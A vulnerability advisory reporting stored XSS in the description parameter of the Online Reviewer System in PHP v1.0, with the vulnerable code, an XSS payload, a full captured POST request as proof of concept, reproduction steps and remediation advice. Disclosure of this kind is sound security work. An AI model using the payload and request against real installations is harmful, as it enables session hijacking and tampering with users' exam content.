## Stored Cross-Site Scripting (XSS) in Online Reviewer System PHP description Parameter
## Credit

Discovered by: Ahmad Marzook

## Product

Online Reviewer System in PHP

## Vendor

Code-Projects

## Vendor Homepage

https://code-projects.org/online-reviewer-system-in-php-with-source-code/

## Affected Version

Online Reviewer System v1.0

## Vulnerability Type

Stored Cross-Site Scripting (Stored XSS)

CWE

CWE-79 – Improper Neutralization of Input During Web Page Generation (Cross-Site Scripting)

## Severity

Medium

## Description

The Online Reviewer System in PHP v1.0 is affected by a Stored Cross-Site Scripting (XSS) vulnerability in the btn_functions.php component. The issue occurs when the application processes the description parameter during the action=update request. User-supplied input is stored directly in the database without proper validation or output encoding. Because the stored value is later rendered in the web interface without sanitization, attackers can inject malicious HTML or JavaScript code. A crafted payload submitted through the description parameter may execute in the browser of users who view the affected question, leading to potential session hijacking or unauthorized actions within the application.

## The vulnerable file :

/system/system/students/assessments/databank/btn_functions.php

/system/system/students/assessments/databank/index.php

## The following code excerpt from the application demonstrates the issue:

$description = $_POST['description'];

$stmt = "UPDATE questions SET `question_desc` = '$description',
            `option_a` = '$option_a',
            `option_b` = '$option_b',
            `option_c` = '$option_c',
            `option_d` = '$option_d',
            `difficulty_id` = '$difficulty_id',
            `correct_answer` = '$answer',
            `Course`='$course',
            `subject`='$subject'
            WHERE `q_id` = '$q_id'";

Because user-controlled input is inserted directly into the database and later rendered in the web interface without HTML escaping, attackers can inject malicious HTML or JavaScript code.

Once stored in the database, the payload becomes persistent and executes automatically when the affected question is viewed in the application interface.

Testing confirmed that a malicious payload inserted into the description field executes when the question is displayed.

## payload used during testing:

<details/open/ontoggle=prompt(origin)>

When the compromised question is loaded in the application interface, the injected JavaScript executes within the browser of the victim user.

Because the payload is stored server-side and executed whenever the affected content is viewed, this vulnerability is classified as a Stored (Persistent) Cross-Site Scripting vulnerability.

## Root Cause

The vulnerability is caused by improper handling of user-controlled input within the question update functionality.

Specifically:

The application accepts arbitrary user input from the description parameter via $_POST.

The input is stored directly in the database using a dynamically constructed SQL query.

The application does not validate or sanitize the input before storage.

When the stored value is later rendered in the application interface, the output is not encoded using HTML escaping functions such as htmlspecialchars().

The relevant vulnerable code is:

$description = $_POST['description'];

$stmt = "UPDATE questions SET `question_desc` = '$description' WHERE `q_id` = '$q_id'";

Because the application does not neutralize HTML special characters, malicious markup is interpreted and executed by the browser.

This combination of unsanitized input storage and unescaped output rendering leads to a persistent XSS vulnerability.

## Affected Endpoint
/OnlineReviewerSystem_PHP/reviewer/system/system/admins/assessments/databank/btn_functions.php?action=update
## Vulnerable Parameter
description
## HTTP Method
POST
## Proof of Concept

The following request demonstrates exploitation of the vulnerability:
```plain
POST /OnlineReviewerSystem_PHP/reviewer/system/system/admins/assessments/databank/btn_functions.php?action=update HTTP/1.1
Host: localhost
Content-Length: 1398
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="145", "Not:A-Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "macOS"
Accept-Language: en-US,en;q=0.9
Origin: http://localhost
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryja1mArqsbBbzD5sk
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/OnlineReviewerSystem_PHP/reviewer/system/system/admins/assessments/databank/question-update.php?id=237
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=r8lic3o19qngid0clllb39s0n6
Connection: keep-alive

------WebKitFormBoundaryja1mArqsbBbzD5sk
Content-Disposition: form-data; name="difficulty_id"

1
------WebKitFormBoundaryja1mArqsbBbzD5sk
Content-Disposition: form-data; name="test_desc"

CIVIL ENGINEERING
------WebKitFormBoundaryja1mArqsbBbzD5sk
Content-Disposition: form-data; name="test_subject"

Mathematics, Surveying and Transportation Engineering
------WebKitFormBoundaryja1mArqsbBbzD5sk
Content-Disposition: form-data; name="question_id"

237
------WebKitFormBoundaryja1mArqsbBbzD5sk
Content-Disposition: form-data; name="description"

<details/open/ontoggle=prompt(origin)>
------WebKitFormBoundaryja1mArqsbBbzD5sk
Content-Disposition: form-data; name="option_a"

sad
------WebKitFormBoundaryja1mArqsbBbzD5sk
Content-Disposition: form-data; name="option_b"

d
------WebKitFormBoundaryja1mArqsbBbzD5sk
Content-Disposition: form-data; name="option_c"

sad
------WebKitFormBoundaryja1mArqsbBbzD5sk
Content-Disposition: form-data; name="option_d"

asd
------WebKitFormBoundaryja1mArqsbBbzD5sk
Content-Disposition: form-data; name="answer"

A
------WebKitFormBoundaryja1mArqsbBbzD5sk
Content-Disposition: form-data; name="personImage"; filename=""
Content-Type: application/octet-stream


------WebKitFormBoundaryja1mArqsbBbzD5sk
Content-Disposition: form-data; name="btnUpdateQuestion"

Save changes
------WebKitFormBoundaryja1mArqsbBbzD5sk--

```
PoC 1 From Burp suite

## Steps to Reproduce

Install the Online Reviewer System in PHP application.

Login to the administrator interface.

Navigate to the question databank management page.

Edit an existing question.

Intercept the update request using Burp Suite or a similar proxy tool.

Insert the following payload in the description parameter:

<details/open/ontoggle=prompt(origin)>

Submit the modified request.

View the updated question within the application interface.

## Result

When the affected question is viewed, the injected JavaScript payload executes in the browser of the user viewing the page.

This confirms that the application renders stored user input without proper sanitization.

## Impact

Successful exploitation of this vulnerability allows attackers to:

Execute arbitrary JavaScript in victim browsers

Steal authentication cookies

Hijack administrator sessions

Perform unauthorized actions within the application

Inject malicious content into exam questions

Conduct phishing attacks against application users

Because the payload is stored in the database, the attack may affect any user who views the compromised question.

## Vulnerability Classification
CWE

CWE-79 – Cross-Site Scripting

OWASP Top 10

A03:2021 – Injection

## Suggested Remediation

Developers should implement the following security measures.

Output Encoding

User-controlled data should be encoded before being rendered in HTML responses.


echo htmlspecialchars($row['question_desc'], ENT_QUOTES, 'UTF-8');
Input Validation

Validate and sanitize user input before storing it in the database.

Use Prepared Statements

Avoid constructing SQL queries using string concatenation.


$stmt = $conn->prepare("UPDATE questions SET question_desc = ? WHERE q_id = ?");
$stmt->execute([$description, $q_id]);
Content Security Policy

Implement a Content Security Policy (CSP) to mitigate script execution risks.

Example:

Content-Security-Policy: default-src 'self'

PoC: 

https://github.com/user-attachments/assets/643289f1-3069-4ae0-b7e8-6a29dd44279b
